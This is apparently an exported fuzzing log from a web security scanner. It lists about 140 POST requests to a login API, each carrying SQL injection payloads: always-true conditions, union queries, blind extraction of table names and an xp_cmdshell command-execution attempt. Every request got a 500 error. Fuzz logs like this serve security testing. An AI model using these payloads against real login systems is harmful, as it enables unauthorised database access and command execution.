Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
529,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,39,544,14,,Reflected,"[1' or '1'='1, a]"
533,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,39,544,14,,,"[1' or '1'='1, @]"
531,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,43,544,14,,,"[1' or '1'='1, a' --]"
535,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,58,544,14,,,"[1' or '1'='1, ' and 1=0) union all]"
534,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,39,544,14,,,"[1' or '1'='1, ?]"
536,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,632,49,544,14,,,"[1' or '1'='1, ? or 1=1 --]"
537,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,63,544,14,,,"[1' or '1'='1, x' and userid is NULL; --]"
538,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,62,544,14,,,"[1' or '1'='1, x' and email is NULL; --]"
541,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,70,544,14,,,"[1' or '1'='1, x' and members.email is NULL; --]"
540,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,81,544,14,,,"[1' or '1'='1, x' and 1=(select count(*) from tabname); --]"
542,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,65,544,14,,,"[1' or '1'='1, x' or full_name like '%bob%]"
543,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,51,544,14,,,"[1' or '1'='1, 23 or 1=1; --]"
545,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,632,52,544,14,,Reflected,"[1 and user_name() = 'dbo', a]"
548,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,64,544,14,,,"[1 and user_name() = 'dbo', a' or 1=1; --]"
544,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,87,544,14,,,"[1' or '1'='1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
546,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,54,544,14,,,"[1 and user_name() = 'dbo', a' ]"
547,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,56,544,14,,,"[1 and user_name() = 'dbo', a' --]"
550,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,52,544,14,,,"[1 and user_name() = 'dbo', ?]"
551,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,71,544,14,,,"[1 and user_name() = 'dbo', ' and 1=0) union all]"
549,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,632,52,544,14,,,"[1 and user_name() = 'dbo', @]"
553,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,76,544,14,,,"[1 and user_name() = 'dbo', x' and userid is NULL; --]"
552,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,632,62,544,14,,,"[1 and user_name() = 'dbo', ? or 1=1 --]"
555,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,70,544,14,,,"[1 and user_name() = 'dbo', anything' or 'x'='x]"
556,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,94,544,14,,,"[1 and user_name() = 'dbo', x' and 1=(select count(*) from tabname); --]"
539,Fuzzed,Sat Jan 11 17:02:45 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,362,632,57,544,14,,,"[1' or '1'='1, anything' or 'x'='x]"
554,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,632,75,544,14,,,"[1 and user_name() = 'dbo', x' and email is NULL; --]"
557,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,83,544,14,,,"[1 and user_name() = 'dbo', x' and members.email is NULL; --]"
561,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,28,544,14,,Reflected,"[1, a]"
562,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,30,544,14,,,"[1, a' ]"
558,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,78,544,14,,,"[1 and user_name() = 'dbo', x' or full_name like '%bob%]"
559,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,64,544,14,,,"[1 and user_name() = 'dbo', 23 or 1=1; --]"
563,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,32,544,14,,,"[1, a' --]"
565,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,97,632,28,544,14,,,"[1, @]"
566,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,93,632,28,544,14,,,"[1, ?]"
564,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,128,632,40,544,14,,,"[1, a' or 1=1; --]"
567,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,47,544,14,,,"[1, ' and 1=0) union all]"
568,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,38,544,14,,,"[1, ? or 1=1 --]"
570,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,51,544,14,,,"[1, x' and email is NULL; --]"
569,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,632,52,544,14,,,"[1, x' and userid is NULL; --]"
572,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,632,70,544,14,,,"[1, x' and 1=(select count(*) from tabname); --]"
571,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,46,544,14,,,"[1, anything' or 'x'='x]"
573,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,59,544,14,,,"[1, x' and members.email is NULL; --]"
560,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,358,633,100,544,14,,,"[1 and user_name() = 'dbo', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
577,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,87,632,52,544,14,,Reflected,"[1 and user_name() = 'dbo', a]"
576,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,632,76,544,14,,,"[1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
578,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,54,544,14,,,"[1 and user_name() = 'dbo', a' ]"
581,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,632,52,544,14,,,"[1 and user_name() = 'dbo', @]"
579,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,56,544,14,,,"[1 and user_name() = 'dbo', a' --]"
582,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,52,544,14,,,"[1 and user_name() = 'dbo', ?]"
584,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,62,544,14,,,"[1 and user_name() = 'dbo', ? or 1=1 --]"
583,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,71,544,14,,,"[1 and user_name() = 'dbo', ' and 1=0) union all]"
585,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,76,544,14,,,"[1 and user_name() = 'dbo', x' and userid is NULL; --]"
575,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,344,632,40,544,14,,,"[1, 23 or 1=1; --]"
587,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,70,544,14,,,"[1 and user_name() = 'dbo', anything' or 'x'='x]"
586,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,75,544,14,,,"[1 and user_name() = 'dbo', x' and email is NULL; --]"
574,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,421,632,54,544,14,,,"[1, x' or full_name like '%bob%]"
588,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,632,94,544,14,,,"[1 and user_name() = 'dbo', x' and 1=(select count(*) from tabname); --]"
589,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,83,544,14,,,"[1 and user_name() = 'dbo', x' and members.email is NULL; --]"
590,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,78,544,14,,,"[1 and user_name() = 'dbo', x' or full_name like '%bob%]"
591,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,64,544,14,,,"[1 and user_name() = 'dbo', 23 or 1=1; --]"
580,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,357,632,64,544,14,,,"[1 and user_name() = 'dbo', a' or 1=1; --]"
593,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,109,632,45,544,14,,Reflected,"[\'; desc users; --, a]"
596,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,632,57,544,14,,,"[\'; desc users; --, a' or 1=1; --]"
592,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,100,544,14,,,"[1 and user_name() = 'dbo', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
597,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,45,544,14,,,"[\'; desc users; --, @]"
595,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,49,544,14,,,"[\'; desc users; --, a' --]"
594,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,47,507,14,,,"[\'; desc users; --, a' ]"
598,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,45,544,14,,,"[\'; desc users; --, ?]"
599,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,64,544,14,,,"[\'; desc users; --, ' and 1=0) union all]"
602,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,68,544,14,,,"[\'; desc users; --, x' and email is NULL; --]"
605,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,632,76,544,14,,,"[\'; desc users; --, x' and members.email is NULL; --]"
601,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,69,544,14,,,"[\'; desc users; --, x' and userid is NULL; --]"
603,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,63,544,14,,,"[\'; desc users; --, anything' or 'x'='x]"
607,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,632,57,544,14,,,"[\'; desc users; --, 23 or 1=1; --]"
608,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,632,93,544,14,,,"[\'; desc users; --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
606,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,71,544,14,,,"[\'; desc users; --, x' or full_name like '%bob%]"
609,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,632,31,544,14,,Reflected,"[1\'1, a]"
610,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,33,544,14,,,"[1\'1, a' ]"
611,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,35,544,14,,,"[1\'1, a' --]"
612,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,43,544,14,,,"[1\'1, a' or 1=1; --]"
613,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,31,507,14,,,"[1\'1, @]"
600,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,346,632,55,544,14,,,"[\'; desc users; --, ? or 1=1 --]"
616,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,41,544,14,,,"[1\'1, ? or 1=1 --]"
614,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,31,544,14,,,"[1\'1, ?]"
615,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,50,544,14,,,"[1\'1, ' and 1=0) union all]"
617,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,55,544,14,,,"[1\'1, x' and userid is NULL; --]"
619,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,73,632,49,544,14,,,"[1\'1, anything' or 'x'='x]"
620,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,632,73,544,14,,,"[1\'1, x' and 1=(select count(*) from tabname); --]"
621,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,109,632,62,544,14,,,"[1\'1, x' and members.email is NULL; --]"
622,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,57,544,14,,,"[1\'1, x' or full_name like '%bob%]"
624,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,79,544,14,,,"[1\'1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
628,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,69,544,14,,,"[1' and non_existant_table = '1, a' or 1=1; --]"
626,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,59,544,14,,,"[1' and non_existant_table = '1, a' ]"
627,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,61,544,14,,,"[1' and non_existant_table = '1, a' --]"
629,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,632,57,544,14,,,"[1' and non_existant_table = '1, @]"
604,Fuzzed,Sat Jan 11 17:02:46 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,640,632,87,722,14,,,"[\'; desc users; --, x' and 1=(select count(*) from tabname); --]"
630,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,632,57,544,14,,,"[1' and non_existant_table = '1, ?]"
631,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,632,76,544,14,,,"[1' and non_existant_table = '1, ' and 1=0) union all]"
632,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,67,544,14,,,"[1' and non_existant_table = '1, ? or 1=1 --]"
623,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,366,632,43,544,14,,,"[1\'1, 23 or 1=1; --]"
625,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,361,632,57,544,14,,Reflected,"[1' and non_existant_table = '1, a]"
633,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,81,544,14,,,"[1' and non_existant_table = '1, x' and userid is NULL; --]"
636,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,99,544,14,,,"[1' and non_existant_table = '1, x' and 1=(select count(*) from tabname); --]"
618,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,497,632,54,722,14,,,"[1\'1, x' and email is NULL; --]"
637,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,88,544,14,,,"[1' and non_existant_table = '1, x' and members.email is NULL; --]"
635,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,75,544,14,,,"[1' and non_existant_table = '1, anything' or 'x'='x]"
638,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,632,83,544,14,,,"[1' and non_existant_table = '1, x' or full_name like '%bob%]"
641,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,632,68,544,14,,Reflected,"[' or username is not NULL or username = ', a]"
639,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,632,69,544,14,,,"[1' and non_existant_table = '1, 23 or 1=1; --]"
642,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,632,70,544,14,,,"[' or username is not NULL or username = ', a' ]"
640,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,105,544,14,,,"[1' and non_existant_table = '1, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
644,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,632,80,544,14,,,"[' or username is not NULL or username = ', a' or 1=1; --]"
643,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,72,544,14,,,"[' or username is not NULL or username = ', a' --]"
647,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,87,544,14,,,"[' or username is not NULL or username = ', ' and 1=0) union all]"
646,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,632,68,544,14,,,"[' or username is not NULL or username = ', ?]"
649,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,92,544,14,,,"[' or username is not NULL or username = ', x' and userid is NULL; --]"
651,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,632,86,544,14,,,"[' or username is not NULL or username = ', anything' or 'x'='x]"
650,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,91,544,14,,,"[' or username is not NULL or username = ', x' and email is NULL; --]"
653,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,76,632,99,544,14,,,"[' or username is not NULL or username = ', x' and members.email is NULL; --]"
652,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,110,544,14,,,"[' or username is not NULL or username = ', x' and 1=(select count(*) from tabname); --]"
654,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,632,94,544,14,,,"[' or username is not NULL or username = ', x' or full_name like '%bob%]"
656,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,116,544,14,,,"[' or username is not NULL or username = ', '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
655,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,632,80,507,14,,,"[' or username is not NULL or username = ', 23 or 1=1; --]"
658,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,123,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, a' ]"
645,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,358,632,68,544,14,,,"[' or username is not NULL or username = ', @]"
659,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,125,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, a' --]"
661,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,83,633,121,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, @]"
662,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,121,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, ?]"
634,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,637,632,80,507,14,,,"[1' and non_existant_table = '1, x' and email is NULL; --]"
663,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,140,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, ' and 1=0) union all]"
648,Fuzzed,Sat Jan 11 17:02:47 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,453,632,78,544,14,,,"[' or username is not NULL or username = ', ? or 1=1 --]"
665,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,145,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, x' and userid is NULL; --]"
664,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,86,633,131,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, ? or 1=1 --]"
667,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,139,507,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, anything' or 'x'='x]"
660,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,219,633,133,722,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, a' or 1=1; --]"
669,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,74,633,152,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, x' and members.email is NULL; --]"
670,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,82,633,147,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, x' or full_name like '%bob%]"
668,Fuzzed,Sat Jan 11 17:02:48 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,163,544,14,,,"[1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116, x' and 1=(select count(*) from tabname); --]"
